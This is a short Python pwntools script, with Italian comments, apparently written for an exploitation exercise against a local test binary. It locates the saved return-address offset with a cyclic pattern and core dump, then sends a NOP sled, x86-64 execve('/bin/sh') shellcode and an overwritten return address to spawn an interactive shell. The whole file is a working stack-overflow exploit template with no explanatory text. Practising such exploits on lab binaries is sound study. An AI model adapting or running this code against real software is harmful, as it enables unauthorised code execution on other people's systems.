from pwn import *
from pwn import p64
from struct import pack

def main():
    e = ELF('../Machines/test')
    context.binary = e
    p = process(e.path)

    p.recvline()
    p.sendline(cyclic(600))
    p.wait()
    core = p.corefile
    stack = core.rsp #indirizzo del registro rsp
    info("Indirizzo del $rip = %#x", stack)
    pattern = core.read(stack, 4)
    rip_offset = cyclic_find(pattern) #dimensione del payload
    info("L'offset del $rip è di %d", rip_offset)
    p.close()

    p = process(e.path)
    nop = b"\x90"*(rip_offset-70)
    # Address in the middle of the nop stack
    addr = stack - rip_offset//2
    info("Probabile indirizzo di un nop = %s", hex(addr))
    shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"


    payload = nop
    payload += shellcode
    payload = payload.ljust(rip_offset, b'A')
    payload += pack("<Q", addr)

    p.recvline()
    p.sendline(payload)
    p.interactive()


if __name__ == '__main__':
    main()